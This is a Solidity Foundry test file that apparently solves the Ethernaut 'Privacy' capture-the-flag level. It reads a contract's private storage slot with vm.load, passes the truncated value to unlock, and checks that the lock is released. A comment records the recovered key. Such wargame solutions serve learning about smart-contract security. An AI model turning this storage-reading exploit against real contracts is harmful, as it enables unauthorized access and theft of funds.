// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {Privacy} from "../src/Privacy.sol";

contract AttackTest is Test {
    Privacy public privacy = Privacy(0x4EB838cc90843f385a93c81f5405e76e910E0Ae9);

    function testAttack() public {
        bytes32 data = vm.load(address(privacy), bytes32(uint256(5)));

        console.logBytes16(bytes16(data));
        privacy.unlock(bytes16(data));
        
        assertFalse(privacy.locked());
    }

}

// 0xa0fb5d501998687a842df6397fbf1892
